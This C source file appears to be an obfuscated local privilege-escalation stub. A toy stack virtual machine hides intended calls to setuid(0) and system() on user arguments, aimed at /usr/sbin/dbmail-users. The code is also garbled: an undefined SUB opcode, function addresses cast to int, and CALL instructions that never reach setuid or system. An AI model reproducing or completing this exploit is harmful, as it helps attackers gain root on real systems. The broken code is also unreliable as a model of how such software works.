#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define UID 0
#define CMD "/usr/sbin/dbmail-users"
#define STACK_SIZE 1024
#define CODE_SIZE 1024

typedef enum {
    PUSH, POP, ADD, JMP, JZ, LOAD, STORE, CALL, RET, HALT
} Instruction;

typedef struct {
    int stack[STACK_SIZE];
    int sp;
    int pc;
    int code[CODE_SIZE];
} VM;

void init_vm(VM *vm) {
    vm->sp = -1;
    vm->pc = 0;
    memset(vm->stack, 0, sizeof(vm->stack));
    memset(vm->code, 0, sizeof(vm->code));
}

void push(VM *vm, int value) {
    vm->stack[++vm->sp] = value;
}

int pop(VM *vm) {
    return vm->stack[vm->sp--];
}

void run_vm(VM *vm) {
    int running = 1;
    while (running) {
        switch (vm->code[vm->pc++]) {
            case PUSH:
                push(vm, vm->code[vm->pc++]);
                break;
            case POP:
                pop(vm);
                break;
            case ADD: {
                int b = pop(vm);
                int a = pop(vm);
                push(vm, a + b);
                break;
            }
            case JMP:
                vm->pc = vm->code[vm->pc];
                break;
            case JZ: {
                int addr = vm->code[vm->pc++];
                if (pop(vm) == 0) {
                    vm->pc = addr;
                }
                break;
            }
            case LOAD: {
                int addr = vm->code[vm->pc++];
                push(vm, vm->stack[addr]);
                break;
            }
            case STORE: {
                int addr = vm->code[vm->pc++];
                vm->stack[addr] = pop(vm);
                break;
            }
            case CALL: {
                int addr = vm->code[vm->pc++];
                push(vm, vm->pc);
                vm->pc = addr;
                break;
            }
            case RET:
                vm->pc = pop(vm);
                break;
            case HALT:
                running = 0;
                break;
        }
    }
}

int main(int argc, char *argv[]) {
    VM vm;
    init_vm(&vm);

    char cmnd[255];
    strcpy(cmnd, CMD);
    push(&vm, argc);
    push(&vm, (int)argv);

    vm.code[0] = PUSH;
    vm.code[1] = 1;
    vm.code[2] = LOAD;
    vm.code[3] = 0;
    vm.code[4] = PUSH;
    vm.code[5] = 1;
    vm.code[6] = SUB;
    vm.code[7] = JZ;
    vm.code[8] = 20;
    vm.code[9] = PUSH;
    vm.code[10] = 1;
    vm.code[11] = LOAD;
    vm.code[12] = 1;
    vm.code[13] = STORE;
    vm.code[14] = PUSH;
    vm.code[15] = 0;
    vm.code[16] = LOAD;
    vm.code[17] = 1;
    vm.code[18] = ADD;
    vm.code[19] = JMP;
    vm.code[20] = 9;
    vm.code[21] = PUSH;
    vm.code[22] = UID;
    vm.code[23] = CALL;
    vm.code[24] = 40;
    vm.code[25] = CALL;
    vm.code[26] = 50;
    vm.code[27] = JZ;
    vm.code[28] = 60;
    vm.code[29] = PUSH;
    vm.code[30] = 1;
    vm.code[31] = HALT;
    vm.code[40] = PUSH;
    vm.code[41] = (int)setuid;
    vm.code[42] = CALL;
    vm.code[43] = RET;
    vm.code[50] = PUSH;
    vm.code[51] = (int)system;
    vm.code[52] = CALL;
    vm.code[53] = RET;
    vm.code[60] = PUSH;
    vm.code[61] = 0;
    vm.code[62] = HALT;

    run_vm(&vm);

    return pop(&vm);
}